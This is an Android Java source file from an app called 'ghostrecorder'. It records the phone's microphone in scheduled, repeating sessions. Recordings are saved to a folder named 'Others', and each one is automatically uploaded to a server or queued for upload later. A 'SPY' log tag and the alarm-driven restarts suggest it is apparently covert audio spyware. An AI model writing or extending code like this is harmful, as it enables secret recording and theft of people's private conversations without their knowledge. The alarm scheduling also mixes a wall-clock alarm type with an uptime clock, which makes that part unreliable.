package com.byteshaft.ghostrecorder;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.SystemClock;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;

public class RecorderHelpers extends ContextWrapper implements
        CustomMediaRecorder.OnNewFileWrittenListener,
        CustomMediaRecorder.OnRecordingStateChangedListener {

    private static CustomMediaRecorder sRecorder;
    private PendingIntent pendingIntent;
    private AlarmManager alarmManager;
    private int mLoopCounter;
    private final int MAX_LENGTH = 20000;
    private int mTotalRecordTime;
    private int mCompleteRepeats;
    private float mPartialRepeats;
    private int mRecordingGap;
    private int mRecordingInstance;
    private BroadcastReceiver mScheduledRecordingsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int time = intent.getExtras().getInt("RECORD_TIME", mRecordingInstance);
            startRecording(time);
        }
    };

    public RecorderHelpers(Context base) {
        super(base);
    }

    void startRecording(int time) {
        if (CustomMediaRecorder.isRecording()) {
            Log.i("SPY", "Recording already in progress");
            return;
        }
        sRecorder = CustomMediaRecorder.getInstance();
        sRecorder.reset();
        sRecorder.setOnNewFileWrittenListener(this);
        sRecorder.setOnRecordingStateChangedListener(this);
        sRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        sRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        sRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        sRecorder.setAudioEncodingBitRate(16000);
        sRecorder.setDuration(time);
        sRecorder.setOutputFile(Environment.getExternalStorageDirectory() + "/" + "Others/" + getTimeStamp() + ".aac");
        System.out.println("Recording for: " + time);

        try {
            sRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        sRecorder.start();
    }

    void startRecording(int time, int test) {
        if (time < MAX_LENGTH) {
            startRecording(time);
        } else {
            if (mLoopCounter == 0) {
                mLoopCounter = time / MAX_LENGTH;
            }
            startRecording(MAX_LENGTH);
        }
    }

    void startRecording(int totalTime, int gapInterval, int recordingInstance) {
        IntentFilter filter = new IntentFilter("com.byteshaft.startAlarm");
        getApplicationContext().registerReceiver(mScheduledRecordingsReceiver, filter);
        mRecordingGap = gapInterval;
        float parts = (float) totalTime / (float) recordingInstance;
        mCompleteRepeats = (int) parts;
        mPartialRepeats = parts - mCompleteRepeats;
        mRecordingInstance = recordingInstance;
        startRecording(mRecordingInstance);
        mCompleteRepeats--;
    }

     void stopRecording() {
        if (CustomMediaRecorder.isRecording()) {
            sRecorder.stop();
            sRecorder.reset();
            sRecorder.release();
            cancelAlarm();
            sRecorder = null;
        }
    }

    void createRecordingDirectoryIfNotAlreadyCreated() {
        File recordingsDirectory = new File(Environment.getExternalStorageDirectory() + "/" + "Others");
        if (!recordingsDirectory.exists()) {
            recordingsDirectory.mkdir();
        }
    }

    public void cancelAlarm() {
        if (alarmManager != null) {
            alarmManager.cancel(pendingIntent);
        }
    }

    private String getTimeStamp() {
        return new SimpleDateFormat("yyyyMMddhhmmss", Locale.US).format(new Date());
    }

    @Override
    public void onNewRecordingCompleted(String path) {
        ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(path));
        UploadRecordingTaskHelpers  uploadRecordingTaskHelpers
                = new UploadRecordingTaskHelpers(getApplicationContext());
        if (uploadRecordingTaskHelpers.isNetworkAvailable()) {
            new UploadRecordingTask(getApplicationContext()).execute(arrayList);
        } else {
            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
                    (getApplicationContext());;
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, path);
        }
    }

    @Override
    public void onStop(int stopper) {
        switch (stopper) {
            case AppGlobals.STOPPED_AFTER_TIME:
                System.out.println("Remaining partial repeats " + mPartialRepeats);
                System.out.println("Remaining complete repeats " + mCompleteRepeats);
                if (mCompleteRepeats > 0) {
                    Intent intent = new Intent("com.byteshaft.startAlarm");
                    pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
                    alarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
                    alarmManager.set(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime() + mRecordingGap, pendingIntent);
                    mCompleteRepeats--;
                    return;
                } else if (mPartialRepeats != 0) {
                    int time = (int) (mRecordingInstance * mPartialRepeats);
                    Intent intent = new Intent("com.byteshaft.startAlarm");
                    intent.putExtra("RECORD_TIME", time);
                    pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
                    alarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
                    alarmManager.set(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime() + mRecordingGap, pendingIntent);
                    mPartialRepeats = 0;
                    return;
                }
                if (mLoopCounter > 0) {
                    startRecording(MAX_LENGTH);
                    mLoopCounter--;
                }
                break;
            case AppGlobals.STOPPED_WITH_DIRECT_CALL:
                Helpers.resetAllRecordTimes();
                break;
            case AppGlobals.SERVER_DIED:
                break;
            }
        }
    }

